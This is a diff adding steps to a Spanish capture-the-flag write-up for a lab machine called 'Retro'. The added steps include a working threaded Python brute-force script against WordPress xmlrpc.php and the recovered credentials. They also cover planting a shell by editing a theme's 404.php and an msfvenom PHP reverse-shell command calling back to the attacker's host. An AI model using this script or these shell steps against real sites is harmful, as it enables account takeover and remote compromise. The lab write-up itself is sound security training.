@@ -159,7 +159,108 @@ Enunciado :
 
 3) Creamos un script en python que nos automatize el ataque de Brute Froce contra el login de WP
 
-   
+        import requests
+        import concurrent.futures
+        
+        flag = 0
+        
+        def brute_wp(passwd,usuario,url):
+        
+        	global flag
+        
+        	if flag != 1:
+        
+        		cookie = {'Cookie':'wordpress_test_cookie=WP+Cookie+check'}
+        		datos = """<?xml version="1.0" encoding="UTF-8"?>
+        						<methodCall> 
+        						<methodName>wp.getUsersBlogs</methodName> 
+        						<params> 
+        						<param><value>{}</value></param> 
+        						<param><value>{}</value></param> 
+        						</params> 
+        						</methodCall>""".format(usuario,passwd)
+        		
+        		r = requests.post(url,data=datos,headers=cookie)
+        
+        		if r.headers.get('Content-Length') == '403':
+        			if flag !=1:
+        				print('[-]Pass NO --> {}'.format(passwd),end='\r')
+        				print(end='\x1b[2K')
+        		else:
+        			print('[+]Pass SI -->{}'.format(passwd))
+        			print('Finalizando tareas espere...')
+        			flag = 1 
+        			
+        def main():
+        
+        	url = "http://10.10.135.197/retro/xmlrpc.php"
+        	usuario = 'wade'
+        
+        	file = 'dic_baseweb.txt'
+        
+        	with open(file) as dic:
+        		
+        		with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
+        			futures = []
+        
+        			for passwd in dic:
+        				passwd = passwd.strip()
+        				futures.append(executor.submit(brute_wp, passwd, usuario, url))
+        
+        
+        			for futures in concurrent.futures.as_completed(futures):
+        				if flag == 1:
+        					executor.shutdown(wait=False,cancel_futures=True)
+        					exit()
+        
+        if __name__=='__main__':
+        	main()
+
+4) Ejecutamos scrip y obtenemos credenciales
+
+       ┌──(root㉿kali)-[/home/…/ctf/try_ctf/retro/script]
+       └─# python3 brute_wplogin.py 
+       [+]Pass SI -->parzival
+       Finalizando tareas espere...
+
+     Credendiales validad para wordpress ----> wade:parzival
+
+5) Logueamos en WP y obtenemos shell en la maquina victima.
+
+   - Editamos el fichero 404.php del tema actual para poder obtener shell.
+       
+     ![image](https://github.com/Esevka/CTF/assets/139042999/020d55da-a93f-4b46-893c-572647f6d11d)
+
+   - Creamos nuestra reverse shell.
+     
+          ┌──(root㉿kali)-[/home/…/ctf/try_ctf/retro/content]
+          └─# msfvenom -p php/reverse_php LHOST=10.8.64.232 LPORT=1988 -f raw -o Rshell.exe
+          [-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+          [-] No arch selected, selecting arch: php from the payload
+          No encoder specified, outputting raw payload
+          Payload size: 2995 bytes
+          Saved as: Rshell.exe
+
+     -Nos ponemos en escucha para recibir nuestra shell y la ejecutamos.
+
+       ![image](https://github.com/Esevka/CTF/assets/139042999/46d41e08-65b8-42f5-89e5-734e275e0c91)
+
+       ![image](https://github.com/Esevka/CTF/assets/139042999/6218d7e1-a9d4-47ee-9781-156e86cac695)
+
+     -Upgrademos la shell para trabajar comodamente.
+
+     Para ello nos descargamos NetCat la version de 64 ---> https://github.com/int0x33/nc.exe/
+     Lo subimos a la maquina victima y volvemos a realizar una conexion con una shell nueva.
+
+     
+     
+     
+     
+     
+
+
+
+       
 
 
    
